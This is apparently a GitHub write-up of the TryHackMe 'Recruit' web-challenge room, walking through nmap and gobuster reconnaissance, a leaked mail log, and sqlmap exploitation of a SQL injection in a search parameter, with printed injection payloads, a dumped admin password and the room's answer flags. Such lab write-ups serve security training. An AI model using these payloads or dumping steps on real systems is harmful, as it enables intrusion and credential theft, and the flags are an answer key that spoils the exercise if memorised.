<h3 align="center">Jr Penetration Tester &nbsp;&nbsp; · &nbsp;&nbsp; Web Application Vulnerabilities I</h3><h1  align="center"><a href="https://tryhackme.com/room/recruitwebchallenge">Recruit</a></h1>
<p align="center">Infiltrate Recruit's new portal. Map the site, hunt for flaws, and gain unauthorised access<br>
<img width="1200px" src="https://github.com/user-attachments/assets/7cc7e579-0bfa-4534-bc13-49e8df4ab772"><br>If you find it helpful, consider coming back for research.<br><p align="center"><a href="https://githubhttps://github.com/user-attachments/assets/f9d56f26-bf87-4309-b5d8-f98cbb0302b0com/RosanaFSS"><img src="https://img.shields.io/github/followers/RosanaFSS?label=Follow&style=for-the-badge&logo=github&color=24292e" alt="Follow Rosana on GitHub"></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="https://img.shields.io/badge/COMPLETED-2026%2C%20MAY%201-444444?style=for-the-badge&logo=calendar-check" alt="Completion Date"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <a href="https://www.linkedin.com/in/rosanafssantos/"><img src="https://img.shields.io/badge/Connect-LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white" alt="Connect on LinkedIn"></a></p><br>

<h2>Task 1 - Recruit Challenge</h2>

<p><em>Answer the question below</em></p>
<p>1.1. What is the flag value after logging in as a normal user?<br>
<code>THM{LOGGED_IN_USER}</code></p>

<p>1.2. What is the flag value after logging in as admin?<br>
<code>THM{LOGGED_IN_ADM1N1}</code></p>

```bash
:~# nmap -sT -p- -Pn -n -T4 YourTargetIP
Starting Nmap 7.80 ( https://nmap.org ) at 2026-05-01 23:30 BST
Nmap scan report for YourTargetIP
Host is up (0.00059s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 3.92 seconds
```


```bash
:~# nmap -A -p22,53,80 YourTargetIP
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
53/tcp open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Recruit
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 3.10 - 3.13 (94%), Linux 3.8 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT     ADDRESS
1   0.42 ms YourTargetIP

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.22 seconds
```


```bash
:~# gobuster dir -u http://YourTargetIP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://YourTargetIP
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/mail                 (Status: 301) [Size: 313] [--> http://YourTargetIP/mail/]
/assets               (Status: 301) [Size: 315] [--> http://YourTargetIP/assets/]
/phpmyadmin           (Status: 301) [Size: 319] [--> http://YourTargetIP/phpmyadmin/]
/server-status        (Status: 403) [Size: 278]
Progress: 218275 / 218276 (100.00%)
===============================================================
Finished
===============================================================
```


```bash
:~# gobuster dir -u http://YourTargetIP/mail/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,log,eml,bak,old
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://YourTargetIP/mail/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,log,eml,bak,old
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/mail.log             (Status: 200) [Size: 1680]
```


```bash
:~# curl http://YourTargetIP/mail/mail.log -o mail.log
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1680  100  1680    0     0   546k      0 --:--:-- --:--:-- --:--:--  546k
```

<br>
<br>

<img width="800" height="383" alt="image" src="https://github.com/user-attachments/assets/252eed56-db5f-4ed6-9720-6a82aabcc70c" />

<br>
<br>

<img width="800" height="303" alt="image" src="https://github.com/user-attachments/assets/a6fb54b0-3abe-4dc4-bf14-57b4412901a4" />

<br>
<br>

<img width="800" height="318" alt="image" src="https://github.com/user-attachments/assets/24f9801b-df15-40a4-b273-8dc7ce2a5af1" />

<br>
<br>

<img width="800" height="379" alt="image" src="https://github.com/user-attachments/assets/e6d655aa-ef18-44f6-8eda-0995f276e124" />

<br>
<br>

<img width="800" height="392" alt="image" src="https://github.com/user-attachments/assets/a183d870-6c62-4b0d-bd1b-f9190692839a" />

<br>
<br>

<img width="800" height="346" alt="image" src="https://github.com/user-attachments/assets/d862e6c2-1839-4009-bebd-8cecf835104b" />

<br>
<br>

```bash
# sqlmap -r request -p search --dbs
...
GET parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 147 HTTP(s) requests:
---
Parameter: search (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: search=-3979' OR 4587=4587#

    Type: UNION query
    Title: MySQL UNION query (random number) - 4 columns
    Payload: search=-9930' UNION ALL SELECT 2118,2118,CONCAT(0x717a7a7a71,0x535053765643526361526661594161446a4b6e414467426e72534f746b614954654e644a784a6e76,0x7170717871),2118#
---
[23:49:54] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL Unknown
[23:49:55] [INFO] fetching database names
[23:49:55] [INFO] retrieved: 'mysql'
[23:49:55] [INFO] retrieved: 'information_schema'
[23:49:55] [INFO] retrieved: 'performance_schema'
[23:49:55] [INFO] retrieved: 'sys'
[23:49:55] [INFO] retrieved: 'phpmyadmin'
[23:49:55] [INFO] retrieved: 'recruit_db'
available databases [6]:                                                                                                                                           
[*] information_schema
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] recruit_db
[*] sys

[23:49:55] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.65.178.140'
[23:49:55] [WARNING] you haven't updated sqlmap for more than 2220 days!!!

[*] ending @ 23:49:55 /2026-05-01/
```


```bash
:~# sqlmap -r request -p search -D recruit_db --tables
...
Database: recruit_db                                                                                                                                               
[2 tables]
+------------+
| candidates |
| users      |
+------------+
```



```bash
:~# sqlmap -r request -p search -D recruit_db -T users --columns
...
Database: recruit_db                                                                                                                                               
Table: users
[3 columns]
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| id       | int          |
| password | varchar(100) |
| username | varchar(50)  |
+----------+--------------+
```


```bash
# sqlmap -r request -p search -D recruit_db -T users --dump
...
atabase: recruit_db
Table: users
[1 entry]
+------+----------+----------------+
| id   | username | password       |
+------+----------+----------------+
| 1    | admin    | admin@001admin |
+------+----------+----------------+
```

<br>
<br>

<img width="800" height="286" alt="image" src="https://github.com/user-attachments/assets/4bba9811-c67f-4e49-bccd-b075b8d1a35e" />

<br>
<br>

<img width="800" height="395" alt="image" src="https://github.com/user-attachments/assets/c9130808-7cd4-4fa1-ae7c-c94be44844fe" />

<br>
<br>
<h2 align="center">Completed</h2>
<p align="center">                                                       <img width="1000px" src="https://github.com/user-attachments/assets/1f665091-7bb6-459c-a11c-17675a531c65"><br>
                                                                         <img width="1000px" src="https://github.com/user-attachments/assets/aded0582-bf04-4673-b805-19aaf1172389"><br>
                                                                         <img width="1000px" src="https://github.com/user-attachments/assets/b42d61cb-ab47-4a95-abb5-99afbd936aec"></p>
<h2 align="center">My TryHackMe Journey &nbsp; · &nbsp; 2026, May</h2>
<div align="center"><h6>

|Day<br><br><br> |Capability<br>Score<br><br>|Room<br>Name<br><br>|Level<br><br><br>|Type<br><br><br>|Rooms<br>Completed<br><br>|Points<br><br><br>|Badges<br><br><br>|Global<br>All<br>Time<br>|Global<br>Monthly<br><br>|Brazil<br>All<br>Time<br>|Brazil<br>Monthly<br><br>|
|---------------:|-----------------:|:----------------|:---------------|:----------------------------------------:|-------------------------:|-----------------:|-----------------:|--------------------:|------------------------:|--------------------:|---------------:|
|1<br><br>      |109<br><br>       |Recruit<br><br>     |Medium<br><br>    |🚩<br><br>  | 1,189<br><br>| 168,997<br><br>| 93<br><br>|14ᵗʰ<br><br>|35%<br><br>| 2ⁿᵈ<br><br>| 10ᵗʰ<br><br>|

</h6></div>

<p align="center">Stats                                              <br><img width="300px"  src="https://github.com/user-attachments/assets/6050a304-04ee-4788-b697-3ff82ea55e87"><br>
                  Global All Time &nbsp;&nbsp;  14ᵗʰ                  <br><img width="1000px" src="https://github.com/user-attachments/assets/9d86d43f-9441-4d4c-b7a8-0828f7d24448"><br>
                  Global Monthly &nbsp;&nbsp;  Top 35%                <br><img width="1000px" src="https://github.com/user-attachments/assets/b68e2c03-60c2-4452-8f61-e6436eb0fdcf"><br>
                  Brazil All Time &nbsp;&nbsp;  2ⁿᵈ                  <br><img width="1000px" src="https://github.com/user-attachments/assets/8423db81-ee7b-4508-8a68-9c18bf506976"><br>
                  Brazil Monthly &nbsp;&nbsp;   10ᵗʰ                  <br><img width="1000px" src="https://github.com/user-attachments/assets/7fdc2eac-149a-4e13-ac42-0973af9e34aa"></p>

<h1 align="center">Thanks for coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>
